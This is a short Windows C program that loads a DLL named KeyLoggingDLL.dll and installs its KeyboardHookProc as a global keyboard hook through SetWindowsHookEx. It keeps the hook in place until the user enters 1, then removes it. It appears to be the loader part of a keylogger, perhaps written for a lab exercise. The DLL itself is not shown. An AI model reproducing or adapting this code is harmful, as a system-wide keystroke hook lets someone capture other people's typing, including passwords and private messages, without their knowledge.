#include <windows.h>
#include <stdio.h>

int main()
{
	int pid = GetCurrentProcessId();
	printf("PID:%d\n", pid);
	const wchar_t* dll_path = L"C:\\Users\\ISE\\source\\repos\\KeyLoggingDLL\\x64\\Debug\\KeyLoggingDLL.dll";
	HMODULE dll = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);

	HOOKPROC hookproc = (HOOKPROC)GetProcAddress(dll, "KeyboardHookProc");
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookproc, dll, 0);


	int d = 0;
	while (d != 1)
	{
		scanf("%d", &d);
	}
	printf("Out");
	UnhookWindowsHookEx(hook);
	return 0;
}







